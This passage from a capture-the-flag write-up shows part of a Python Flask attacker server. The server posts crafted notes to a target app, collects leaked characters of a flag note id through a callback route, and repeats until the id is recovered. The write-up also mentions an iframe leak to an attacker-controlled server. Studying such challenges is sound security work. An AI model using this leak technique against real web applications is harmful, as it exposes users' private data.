+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;customise&#34;</span>, json<span style="color:#f92672">=</span>options, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;create&#34;</span>, json<span style="color:#f92672">=</span>useless, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attack</span>(found):
+</span></span><span style="display:flex;"><span>	payload<span style="color:#f92672">=</span>gen_payload(found)
+</span></span><span style="display:flex;"><span>	one_step(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hello</span>():
+</span></span><span style="display:flex;"><span>	attack(<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Hello, attacker!&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/found/&lt;note&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">found</span>(note):
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">&#34;Found: &#34;</span>,note)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>		thread<span style="color:#f92672">=</span>Thread(target<span style="color:#f92672">=</span>attack,args<span style="color:#f92672">=</span>(note,))
+</span></span><span style="display:flex;"><span>		thread<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>		print(e)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;You found: </span><span style="color:#e6db74">{</span>note<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>)
+</span></span></code></pre></div><p>This will retreive all but last character of the flag note id which can be bruteforced to get the flag.</p>
 <hr>
 <p>Another simple approach to leaking the flag would be to create an iframe on the attacker note pointing to attacker controlled server where dynamic content can be served. While this is much more simple, I like the complicated approach more :)</p>
 <h3 id="other-interesting-solution">Other interesting solution</h3>
